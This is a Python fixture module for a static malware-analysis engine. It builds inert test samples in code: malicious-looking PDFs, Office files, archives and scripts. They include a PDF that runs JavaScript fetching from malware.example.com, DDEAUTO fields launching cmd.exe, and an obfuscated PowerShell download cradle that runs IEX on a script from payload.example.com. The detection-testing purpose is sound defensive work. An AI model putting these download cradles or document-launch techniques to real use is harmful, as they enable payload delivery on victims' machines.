"""Benign fixtures for the Tier 1 static analysis engine (#1067).

Every sample is **built in code rather than committed as a binary**, on purpose:
a reviewer can read exactly what is in each one, and the repository never
carries an opaque blob that has to be taken on trust. They are inert by
construction -- the "malicious" parts are the structural markers an inspector
looks for (an ``/OpenAction`` entry, a ``DDEAUTO`` field, a base64 string), not
working payloads.

The one genuinely standard artefact is EICAR, which exists precisely so that a
detection pipeline can be proven end to end without handling real malware.
"""

from __future__ import annotations

import base64
import io
import zipfile
import zlib

# The EICAR anti-malware test string. Not malware: a 68-byte agreed-upon string
# that scanners report by convention.
EICAR = rb"X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"

OLE_HEADER = b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\x00" * 24


def pdf_with_openaction_and_js() -> bytes:
    """A PDF whose JavaScript lives inside a Flate-compressed object stream.

    The compression is the point: a raw token scan finds ``/OpenAction`` in the
    catalog but would miss the script entirely, so this fixture is what proves
    the inspector inflates streams rather than only grepping the file.
    """
    script = (
        "var payload = 'http://malware.example.com/stage2.bin';\n" "app.alert('benign fixture');\n" "this.getURL(payload);\n"
    ).encode()
    compressed = zlib.compress(script)

    body = b"".join(
        [
            b"%PDF-1.7\n",
            b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R /OpenAction 4 0 R >>\nendobj\n",
            b"2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n",
            b"3 0 obj\n<< /Type /Page /Parent 2 0 R >>\nendobj\n",
            b"4 0 obj\n<< /Type /Action /S /JavaScript /JS 5 0 R >>\nendobj\n",
            b"5 0 obj\n<< /Length " + str(len(compressed)).encode() + b" /Filter /FlateDecode >>\nstream\n",
            compressed,
            b"\nendstream\nendobj\n",
            b"trailer\n<< /Root 1 0 R >>\n%%EOF\n",
        ],
    )
    return body


def pdf_with_launch_action() -> bytes:
    """A PDF carrying a /Launch action -- the heaviest single PDF flag."""
    return (
        b"%PDF-1.4\n"
        b"1 0 obj\n<< /Type /Catalog /OpenAction 2 0 R >>\nendobj\n"
        b"2 0 obj\n<< /S /Launch /Win << /F (cmd.exe) >> >>\nendobj\n"
        b"trailer\n<< /Root 1 0 R >>\n%%EOF\n"
    )


def truncated_pdf() -> bytes:
    """A PDF header followed by a cut-off object. Must fail cleanly, not 500."""
    return b"%PDF-1.5\n1 0 obj\n<< /Type /Catalog /Pages "


def _ooxml(parts: dict) -> bytes:
    """Build a minimal OOXML package from a {path: bytes} mapping."""
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w", zipfile.ZIP_DEFLATED) as archive:
        archive.writestr(
            "[Content_Types].xml",
            '<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"/>',
        )
        for path, blob in parts.items():
            archive.writestr(path, blob)
    return buffer.getvalue()


def docm_with_vba_project() -> bytes:
    """OOXML carrying a ``vbaProject.bin`` part.

    The part is not a real compound file, so oletools cannot parse it -- which
    is deliberate. It exercises both the container-level ``office.macro_present``
    detection *and* the graceful-degradation path when VBA parsing fails, and a
    genuine compressed VBA project cannot be synthesised without shipping a
    binary blob.
    """
    return _ooxml(
        {
            "word/document.xml": b'<?xml version="1.0"?><document><body>benign</body></document>',
            "word/vbaProject.bin": b"not-a-real-ole-compound-file",
        },
    )


def docx_with_remote_template() -> bytes:
    """OOXML whose settings relationship points at an external template."""
    rels = (
        b'<?xml version="1.0"?>'
        b'<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
        b'<Relationship Id="rId1" '
        b'Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" '
        b'Target="http://templates.example.com/payload.dotm" TargetMode="External"/>'
        b"</Relationships>"
    )
    return _ooxml(
        {
            "word/document.xml": b'<?xml version="1.0"?><document><body>benign</body></document>',
            "word/_rels/settings.xml.rels": rels,
        },
    )


def docx_with_dde() -> bytes:
    """OOXML with a DDEAUTO field instruction in the document body."""
    document = (
        b'<?xml version="1.0"?><document><body>'
        b'<fldSimple w:instr=" DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe \\"/k calc.exe\\" "/>'
        b"</body></document>"
    )
    return _ooxml({"word/document.xml": document})


def legacy_ole_with_dde() -> bytes:
    """An OLE compound-file header followed by a DDEAUTO marker."""
    return OLE_HEADER + b"\x00" * 128 + b"DDEAUTO c:\\windows\\system32\\cmd.exe /k calc.exe" + b"\x00" * 64


def encrypted_ole_package() -> bytes:
    """An OLE container advertising an EncryptedPackage stream."""
    return OLE_HEADER + b"\x00" * 64 + b"E\x00n\x00c\x00r\x00y\x00p\x00t\x00e\x00d\x00" + b"EncryptedPackage" + b"\x00" * 64


def obfuscated_powershell() -> bytes:
    """PowerShell hiding a download cradle behind base64 and string tricks.

    Layered so more than one deobfuscation transform has to fire: the encoded
    command is UTF-16LE base64 (PowerShell's own -EncodedCommand format), and
    the surrounding script splits keywords with concatenation.
    """
    inner = "IEX (New-Object Net.WebClient).DownloadString('http://payload.example.com/a.ps1')"
    encoded = base64.b64encode(inner.encode("utf-16-le")).decode()
    script = (
        "$m = 'Down'+'loadString'\n"
        "$h = [char]104+[char]116+[char]116+[char]112\n"
        f"powershell.exe -nop -w hidden -EncodedCommand {encoded}\n"
    )
    return script.encode()


def plain_script_with_iocs() -> bytes:
    """A script with indicators in plain sight, no obfuscation at all."""
    return (
        b"# benign fixture\n"
        b"$url = 'http://drop.example.com/beacon.bin'\n"
        b"$ip = '203.0.113.45'\n"
        b"$path = 'C:\\Users\\Public\\stage.exe'\n"
        b"$key = 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run'\n"
        b"Write-Host $url $ip $path $key\n"
    )


def eicar_file() -> bytes:
    return EICAR


def ioc_bearing_text() -> bytes:
    return (
        b"Report generated for review.\n"
        b"Callback: https://c2.example.net/gate.php\n"
        b"Host 198.51.100.7 and mail abuse@example.org\n"
        b"Sample sha256 "
        b"9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08\n"
        b"Loader written to /tmp/stage/loader.bin\n"
    )


def _set_encrypted_bit(data: bytes) -> bytes:
    """Set general-purpose bit 0 on every zip header in ``data``.

    ``ZipFile.writestr`` resets ``flag_bits`` on the way to disk, so setting it
    on the ``ZipInfo`` has no effect on the produced bytes. The bit therefore
    has to be flipped in the serialised headers: offset 6 in a local file header
    (``PK\\x03\\x04``) and offset 8 in a central directory entry
    (``PK\\x01\\x02``).

    Patching every signature occurrence is safe here only because the fixtures
    control their own content and none of it contains those byte sequences.
    """
    out = bytearray(data)
    for signature, flag_offset in ((b"PK\x03\x04", 6), (b"PK\x01\x02", 8)):
        start = 0
        while True:
            found = out.find(signature, start)
            if found == -1:
                break
            out[found + flag_offset] |= 0x01
            start = found + 4
    return bytes(out)


def zip_with(entries: dict, encrypt: bool = False) -> bytes:
    """Build a zip from {name: bytes}, optionally marking entries encrypted.

    ``zipfile`` cannot write genuinely encrypted members, and it does not need
    to: the inspector reports an encrypted entry from the header flag alone,
    without decrypting anything.
    """
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w", zipfile.ZIP_DEFLATED) as archive:
        for name, blob in entries.items():
            info = zipfile.ZipInfo(name)
            info.compress_type = zipfile.ZIP_DEFLATED
            archive.writestr(info, blob)

    data = buffer.getvalue()
    return _set_encrypted_bit(data) if encrypt else data


def nested_zip(depth: int, payload: bytes = b"innermost payload") -> bytes:
    """A zip nested ``depth`` levels deep, for the recursion-limit test."""
    current = payload
    for level in range(depth):
        current = zip_with({f"level{depth - level}.zip" if level else "payload.txt": current})
    return current


def seven_zip_stub() -> bytes:
    """7z magic and nothing else -- enough to be identified, not to be expanded."""
    return b"7z\xbc\xaf\x27\x1c" + b"\x00" * 64


def zip_with_double_extension() -> bytes:
    return zip_with({"invoice.pdf.exe": b"MZ\x90\x00 benign fixture, not a real PE"})


def zip_with_executable() -> bytes:
    return zip_with({"tool.bin": b"MZ\x90\x00 benign fixture, not a real PE"})
